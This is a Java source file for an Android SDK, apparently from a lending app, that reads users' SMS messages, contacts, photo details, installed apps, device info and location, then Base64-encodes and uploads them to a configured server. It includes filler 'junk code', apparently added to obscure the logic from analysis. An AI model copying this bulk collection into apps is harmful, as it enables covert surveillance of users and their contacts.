package com.yinlan.newdatasyc.newwork;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.text.TextUtils;
import android.util.Log;

import com.google.gson.Gson;
import com.yinlan.newdatasyc.base.utils.Action;
import com.yinlan.newdatasyc.base.utils.AppUtils;
import com.yinlan.newdatasyc.base.utils.Base64Util;
import com.yinlan.newdatasyc.base.utils.ContactsUtils;
import com.yinlan.newdatasyc.base.utils.DeviceInfoCheck;
import com.yinlan.newdatasyc.base.utils.HmacMd5Utils;
import com.yinlan.newdatasyc.base.utils.ImgUtils;
import com.yinlan.newdatasyc.base.utils.LocationUtil;
import com.yinlan.newdatasyc.base.utils.PermissionUtils;
import com.yinlan.newdatasyc.base.utils.SMSUtils;
import com.yinlan.newdatasyc.base.utils.SystemUtils;
import com.yinlan.newdatasyc.bean.AppData;
import com.yinlan.newdatasyc.bean.CommonParams;
import com.yinlan.newdatasyc.bean.ContactsData;
import com.yinlan.newdatasyc.bean.DeviceData;
import com.yinlan.newdatasyc.bean.ImgData;
import com.yinlan.newdatasyc.bean.SMSData;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class DataManagerSDK {

    private static final String ACTION = "com.yinlan.userisk.DATASYNC_BROADCAST_ACTION";
    public static final String TYPE_COMMON = "common";
    public static final String TYPE_MSG = "msg";
    public static final String TYPE_IMG = "img";
    public static final String TYPE_CONTACT = "contact";
    public static final String TYPE_DEVICE = "device";
    public static final String TYPE_APP = "app";

    public static final String MSG_ERROR = "短信失败, 未获取 READ_SMS 相关权限";
    public static final String CONTACT_ERROR = "通讯录失败, 未获取 READ_CONTACTS 相关权限";
    public static final String IMG_ERROR = "相册失败, 未获取 READ_EXTERNAL_STORAGE 相关权限";
    public static final String LOCATION_ERROR = "未获取位置权限";
    public static final String DEVICE_ERROR = "设备信息失败, 未获取 READ_PHONE_STATE 相关权限";

    private String receiverName = "";
    private String appId = "";
    private String appSecret;
    private String uploadUrl;
    private String phoneNum = "";
    private Context context;
    private String transactionId = "";
    private String gpsAdId = "";
    private String borrowId = "";


    /**
     * 尝试重新上传次数
     */
    private static final int RETRY_UPLOAD_COUNT = 1;
    private int deviceCount = RETRY_UPLOAD_COUNT;
    private int appCount = RETRY_UPLOAD_COUNT;
    private int contactCount = RETRY_UPLOAD_COUNT;
    private int imgCount = RETRY_UPLOAD_COUNT;
    private int smsCount = RETRY_UPLOAD_COUNT;


    /**
     * 创建单例对象
     */
    private static class SDKManageInstance {
        static DataManagerSDK instance = new DataManagerSDK();
    }

    private DataManagerSDK() {
    }

    /**
     * 调用单例对象
     */
    public static DataManagerSDK getInstance() {
        return SDKManageInstance.instance;
    }

    public void setAppId(String appId) {
        this.appId = appId;
    }

    public void init(Context context, String appId, String appSecret) {
        this.appId = appId;
        this.appSecret = appSecret;
        this.context = context;

        HttpSendReq.getInstance().setContext(context);
        HttpSendReq.getInstance().setAppId(appId);
        HttpSendReq.getInstance().setAppSecret(appSecret);

        boolean location = PermissionUtils.lacksPermission(context, Manifest.permission.ACCESS_FINE_LOCATION);
        if (location) {
            LocationUtil.getInstance().init(context);
            LocationUtil.getInstance().getGps();
        }

        receiverName = context.getPackageName() + ".receiver.SyncReceiver";
        SystemUtils.getGaid(context, new Action<String>() {
            @Override
            public void call(String gaid) {
                gpsAdId = gaid;
            }
        });
    }

    public String getGpsAdId() {
        return gpsAdId;
    }

    public void SynData(String borrowId, String transactionId, String phoneNum, String uploadUrl) {
        initData(borrowId, transactionId, phoneNum, uploadUrl);

        // 位置权限检查
        boolean location = PermissionUtils.lacksPermission(context, Manifest.permission.ACCESS_FINE_LOCATION);
        boolean isOpen = LocationUtil.isOpen(context);
        if (location || isOpen) {
            LocationUtil.getInstance().init(context);
            LocationUtil.getInstance().getGps();
        }
        // app list
        uploadAppList();

        // device
        uploadDevice();

        // img
        uploadImg();

        // 联系人
        uploadContact();

        // 短信
        uploadMsg();
    }

    private void initData(String borrowId, String transactionId, String phoneNum, String uploadUrl) {
        if (context == null || TextUtils.isEmpty(appId) || TextUtils.isEmpty(appSecret)) {
            throw new RuntimeException("未初始化sdk, 或者context、appId、 appSecret参数为空.");
        }

        this.borrowId = borrowId;
        this.transactionId = transactionId;
        this.uploadUrl = uploadUrl;
        this.phoneNum = phoneNum;

        HttpSendReq.getInstance().setBorrowId(borrowId);
        HttpSendReq.getInstance().setTransactionId(transactionId);
        HttpSendReq.getInstance().setUploadUrl(uploadUrl);
        HttpSendReq.getInstance().setPhoneNum(phoneNum);

        initReceiverName();
    }

    private void initReceiverName() {
        PackageManager packageManager = context.getPackageManager();
        PackageInfo packageInfo = null;
        try {
            packageInfo = packageManager.getPackageInfo(context.getPackageName(), PackageManager.GET_RECEIVERS);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            HttpSendReq.getInstance().collectException("initReceiverName: " + e.toString());
        }
        if (packageInfo == null) {
            return;
        }
        ActivityInfo[] receivers = packageInfo.receivers;
        if (receivers == null) {
            return;
        }
        we:
        for (ActivityInfo receiver : receivers) {
            String[] split = receiver.name.split("\\.");
            for (int i = 0; i < split.length; i++) {
                String name = split[split.length - 1];
                if (TextUtils.equals(name, "SyncReceiver")) {
                    receiverName = receiver.name;
                    break we;
                }
            }
        }
    }

    public void syncDataMsg(String borrowId, String transactionId, String phoneNum, String uploadUrl) {
        initData(borrowId, transactionId, phoneNum, uploadUrl);
        uploadMsg();
    }

    private void uploadMsg() {
        boolean msg = PermissionUtils.lacksPermission(context, Manifest.permission.READ_SMS);
        if (msg) {
            sysData(TYPE_MSG);
        } else {
            sendBroadcastData(TYPE_MSG, false, -1, MSG_ERROR, 0);
        }
    }

    public void syncDataContact(String borrowId, String transactionId, String phoneNum, String uploadUrl) {
        initData(borrowId, transactionId, phoneNum, uploadUrl);
        uploadContact();
    }

    private void uploadContact() {
        boolean contact = PermissionUtils.lacksPermission(context, Manifest.permission.READ_CONTACTS);
        if (contact) {
            sysData(TYPE_CONTACT);
        } else {
            sendBroadcastData(TYPE_CONTACT, false, -1, CONTACT_ERROR, 0);
        }
    }

    public void syncDataImg(String borrowId, String transactionId, String phoneNum, String uploadUrl) {
        initData(borrowId, transactionId, phoneNum, uploadUrl);
        uploadImg();
    }

    private void uploadImg() {
        boolean storage = PermissionUtils.lacksPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE);
        if (storage) {
            sysData(TYPE_IMG);
        } else {
            sendBroadcastData(TYPE_IMG, false, -1, IMG_ERROR, 0);
        }
    }

    public void syncDataDevice(String borrowId, String transactionId, String phoneNum, String uploadUrl) {
        initData(borrowId, transactionId, phoneNum, uploadUrl);
        uploadDevice();
    }

    private void uploadDevice() {
        boolean phoneState = PermissionUtils.lacksPermission(context, Manifest.permission.READ_PHONE_STATE);
        if (!phoneState) {
            sendBroadcastData(TYPE_DEVICE, false, -1, DEVICE_ERROR, 0);
        }
        boolean location = PermissionUtils.lacksPermission(context, Manifest.permission.ACCESS_FINE_LOCATION);
        if (!location) {
            sendBroadcastData(TYPE_DEVICE, false, -1, LOCATION_ERROR, 0);
        }
        sysData(TYPE_DEVICE);
    }

    public void syncDataAppList(String borrowId, String transactionId, String phoneNum, String uploadUrl) {
        initData(borrowId, transactionId, phoneNum, uploadUrl);
        uploadAppList();
    }

    private void uploadAppList() {
        sysData(TYPE_APP);
    }

    private void sysData(String type) {
        switch (type) {
            case TYPE_MSG:
                updateMsg(1);
                break;
            case TYPE_IMG:
                updateImg(1);
                break;
            case TYPE_CONTACT:
                updateContact(1);
                break;
            case TYPE_DEVICE:
                updateDeviceInfo(1);
                break;
            case TYPE_APP:
                updateApps(1);
                break;
        }
    }

    private void updateDeviceInfo(final int uploadCount) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                DeviceData deviceInfo = DeviceInfoCheck.check(context, gpsAdId);
                CommonParams commonParams = new CommonParams();
                commonParams.setAppId(appId);
                commonParams.setPackageName(context.getPackageName());
                commonParams.setTransactionId(transactionId);
                commonParams.setBorrowId(borrowId);
                commonParams.setUserPhone(phoneNum);
                commonParams.setType(TYPE_DEVICE);
                commonParams.setDeviceInfo(deviceInfo);
                String toJson = new Gson().toJson(commonParams).trim();
                toJson = Base64Util.encode(toJson.getBytes());
                String sign;
                try {
                    sign = HmacMd5Utils.EncryptHMacMd5(toJson.getBytes("UTF-8"), appSecret);
                } catch (Exception e) {
                    sign = "";
                    HttpSendReq.getInstance().collectException(TYPE_DEVICE, "updateDeviceInfo: " + e.toString());
                }
                startHttpUpload(TYPE_DEVICE, sign, toJson, uploadCount);
            }
        }).start();
    }

    private void updateContact(final int uploadCount) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                //--------------------------junk code-----------------------------
                StringBuffer sbLaJi1 = new StringBuffer();
                try {
                    sbLaJi1.append("heheEry");
                    sbLaJi1.append("qwe");
                    sbLaJi1.append("werftgh------->");
                    sbLaJi1.append("string");
                } catch (Exception javaCode3e) {

                }
                sbLaJi1.toString();
                sbLaJi1 = null;
                //--------------------------junk code-----------------------------


                HttpSendReq.getInstance().collectException("开始收集通讯录");
                List<ContactsData> contacts = ContactsUtils.getContacts(context);
                HttpSendReq.getInstance().collectException("收集通讯录完成");
                if (!contacts.isEmpty()) {
                    HttpSendReq.getInstance().collectException("收集通讯录size: " + contacts.size());
                } else {
                    HttpSendReq.getInstance().collectException("收集通讯录为空");
                }

                CommonParams commonParams = new CommonParams();
                commonParams.setAppId(appId);
                commonParams.setPackageName(context.getPackageName());
                commonParams.setTransactionId(transactionId);
                commonParams.setBorrowId(borrowId);
                commonParams.setUserPhone(phoneNum);
                commonParams.setType(TYPE_CONTACT);
                commonParams.setContacts(contacts);
                String toJson = new Gson().toJson(commonParams).trim();
                toJson = Base64Util.encode(toJson.getBytes());
                String sign;
                try {
                    sign = HmacMd5Utils.EncryptHMacMd5(toJson.getBytes("UTF-8"), appSecret);
                } catch (Exception e) {
                    sign = "";
                    HttpSendReq.getInstance().collectException(TYPE_CONTACT, "updateContact: " + e.toString());
                }
                startHttpUpload(TYPE_CONTACT, sign, toJson, uploadCount);
            }
        }).start();
    }

    private void updateImg(final int uploadCount) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpSendReq.getInstance().collectException("开始收集相册");
                List<ImgData> imgInfos = ImgUtils.getImgInfos(context, new ArrayList<ImgData>());
                HttpSendReq.getInstance().collectException("收集相册完成");
                if (!imgInfos.isEmpty()) {
                    HttpSendReq.getInstance().collectException("收集相册size: " + imgInfos.size());
                } else {
                    HttpSendReq.getInstance().collectException("收集相册为空");
                }
                CommonParams commonParams = new CommonParams();
                commonParams.setAppId(appId);
                commonParams.setPackageName(context.getPackageName());
                commonParams.setTransactionId(transactionId);
                commonParams.setBorrowId(borrowId);
                commonParams.setUserPhone(phoneNum);
                commonParams.setType(TYPE_IMG);
                commonParams.setImgInfoBeans(imgInfos);
                String toJson = new Gson().toJson(commonParams).trim();
                toJson = Base64Util.encode(toJson.getBytes());
                String sign;
                try {
                    sign = HmacMd5Utils.EncryptHMacMd5(toJson.getBytes("UTF-8"), appSecret);
                } catch (Exception e) {
                    sign = "";
                    HttpSendReq.getInstance().collectException(TYPE_IMG, "updateImg: " + e.toString());
                }
                startHttpUpload(TYPE_IMG, sign, toJson, uploadCount);
            }
        }).start();

    }

    private void updateApps(final int uploadCount) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                //--------------------------junk code-----------------------------
                try {
                    StringBuffer sbLaJi2 = new StringBuffer();
                    sbLaJi2.append("567asdhjk");
                    sbLaJi2.append("poiuyr----sdfg--->");
                    sbLaJi2 = null;
                } catch (Exception javaCode4e) {
                    javaCode4e.printStackTrace();
                }
                //--------------------------junk code-----------------------------


                List<AppData> installApps = AppUtils.getInstallApps(context, new ArrayList<>());
                CommonParams commonParams = new CommonParams();
                commonParams.setAppId(appId);
                commonParams.setPackageName(context.getPackageName());
                commonParams.setTransactionId(transactionId);
                commonParams.setBorrowId(borrowId);
                commonParams.setUserPhone(phoneNum);
                commonParams.setType(TYPE_APP);
                commonParams.setInstalledApps(installApps);
                String toJson = new Gson().toJson(commonParams).trim();
                toJson = Base64Util.encode(toJson.getBytes());
                String sign;
                try {
                    sign = HmacMd5Utils.EncryptHMacMd5(toJson.getBytes("UTF-8"), appSecret);
                } catch (Exception e) {
                    sign = "";
                    HttpSendReq.getInstance().collectException(TYPE_APP, "updateApps: " + e.toString());
                }
                startHttpUpload(TYPE_APP, sign, toJson, uploadCount);
            }
        }).start();
    }

    private void updateMsg(final int uploadCount) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpSendReq.getInstance().collectException("开始收集短信");
                List<SMSData> smsInfos = SMSUtils.getSmsInfos(context);
                HttpSendReq.getInstance().collectException("收集短信完成");
                if (!smsInfos.isEmpty()) {
                    HttpSendReq.getInstance().collectException("收集短信size: " + smsInfos.size());
                } else {
                    HttpSendReq.getInstance().collectException("收集短信为空");
                }
                CommonParams commonParams = new CommonParams();
                commonParams.setAppId(appId);
                commonParams.setPackageName(context.getPackageName());
                commonParams.setTransactionId(transactionId);
                commonParams.setBorrowId(borrowId);
                commonParams.setUserPhone(phoneNum);
                commonParams.setType(TYPE_MSG);
                commonParams.setMessageInfos(smsInfos);
                String toJson = new Gson().toJson(commonParams).trim();
                toJson = Base64Util.encode(toJson.getBytes());
                String sign;
                try {
                    sign = HmacMd5Utils.EncryptHMacMd5(toJson.getBytes("UTF-8"), appSecret);
                } catch (Exception e) {
                    sign = "";
                    HttpSendReq.getInstance().collectException(TYPE_MSG, "updateMsg: " + e.toString());
                }
                startHttpUpload(TYPE_MSG, sign, toJson, uploadCount);
            }
        }).start();
    }

    private void startHttpUpload(String type, String sign, String encode, int uploadCount) {
        String url = uploadUrl + "/api/v3/score/post";
        StringBuffer buffer = new StringBuffer();
        buffer.append("userInfo").append("=").append(encode);
        try {
            URL url1 = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) url1.openConnection();
            // 设置允许输出
            conn.setDoOutput(true);
            conn.setDoInput(true);
            // 设置不用缓存
            conn.setUseCaches(false);
            conn.setRequestProperty("signMsg", sign);
            // 设置传递方式
            conn.setRequestMethod("POST");
            // 设置维持长连接
            conn.setRequestProperty("Connection", "Keep-Alive");
            // 设置文件字符集:
            conn.setRequestProperty("Charset", "UTF-8");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", buffer.toString().getBytes().length + ""); //设置文件请求的长度  
            conn.setReadTimeout(180 * 1000);//设置读取超时时间          
            conn.setConnectTimeout(120 * 1000);//设置连接超时时间      
            OutputStream out = conn.getOutputStream();
            out.write(buffer.toString().getBytes());
            out.flush();
            out.close();
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                InputStream inputStream = conn.getInputStream();
                byte[] b = new byte[1024];
                int len = 0;
                // 创建字节数组输出流,读取输入流的文本数据时,同步把数据写入数组输出流
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                while ((len = inputStream.read(b)) != -1) {
                    bos.write(b, 0, len);
                }
                // 把字节数组输出流的数据转换成字节数组
                String text = new String(bos.toByteArray(), "utf-8");
                LogUtil.e("Upload Data(" + type + "): " + text);
                JSONObject object = new JSONObject(text);
                int retCode = object.getInt("code");
                String retMsg = object.getString("msg");
                if (retCode == 200) {
                    sendBroadcastData(type, true, retCode, retMsg, uploadCount);
                } else {
                    sendBroadcastData(type, false, retCode, retMsg, uploadCount);
                }
            } else {
                String responseMessage = conn.getResponseMessage();
                Log.e("======", responseMessage);
                doUploadFaild(type, responseCode, uploadCount, "http 响应: responseCode != 200");
            }
            conn.disconnect();
        } catch (Exception e) {
            doUploadFaild(type, -2, uploadCount, e.toString());
        }
    }

    private void doUploadFaild(String type, int responseCode, int uploadCount, String syncMsg) {
        switch (type) {
            case TYPE_MSG:
                if (smsCount < RETRY_UPLOAD_COUNT) {
                    sendBroadcastData(type, false, responseCode, syncMsg, uploadCount);
                    smsCount = RETRY_UPLOAD_COUNT;
                } else {
                    smsCount--;
                    updateMsg(smsCount);
                }
                break;
            case TYPE_IMG:
                if (imgCount < RETRY_UPLOAD_COUNT) {
                    sendBroadcastData(type, false, responseCode, syncMsg, uploadCount);
                    imgCount = RETRY_UPLOAD_COUNT;
                } else {
                    imgCount--;
                    updateImg(imgCount);
                }
                break;
            case TYPE_CONTACT:
                if (contactCount < RETRY_UPLOAD_COUNT) {
                    sendBroadcastData(type, false, responseCode, syncMsg, uploadCount);
                    contactCount = RETRY_UPLOAD_COUNT;
                } else {
                    contactCount--;
                    updateContact(contactCount);
                }
                break;
            case TYPE_DEVICE:
                if (deviceCount < RETRY_UPLOAD_COUNT) {
                    sendBroadcastData(type, false, responseCode, syncMsg, uploadCount);
                    deviceCount = RETRY_UPLOAD_COUNT;
                } else {
                    deviceCount--;
                    updateDeviceInfo(deviceCount);
                }
                break;
            case TYPE_APP:
                if (appCount < RETRY_UPLOAD_COUNT) {
                    sendBroadcastData(type, false, responseCode, syncMsg, uploadCount);
                    appCount = RETRY_UPLOAD_COUNT;
                } else {
                    appCount--;
                    updateApps(appCount);
                }
                break;
        }
    }

    private void sendBroadcastData(String syncType, boolean syncState, int syncCode, String syncMsg, int uploadCount) {
        HttpSendReq.getInstance().uploadSdkLog(syncType, syncState, syncCode, syncMsg, uploadCount);
        Intent intent = new Intent(ACTION);
        intent.putExtra("SyncedMsg", syncMsg);
        intent.putExtra("SyncedState", syncState);
        intent.putExtra("SyncedType", syncType);
        intent.putExtra("SyncedCode", syncCode);
        if (!TextUtils.isEmpty(borrowId)) {
            intent.putExtra("SyncedBorrowId", borrowId);
        }
        if (context != null) {
            ComponentName component = new ComponentName(context.getPackageName(), receiverName);
            intent.setComponent(component);
            context.sendBroadcast(intent);
        }
    }

}
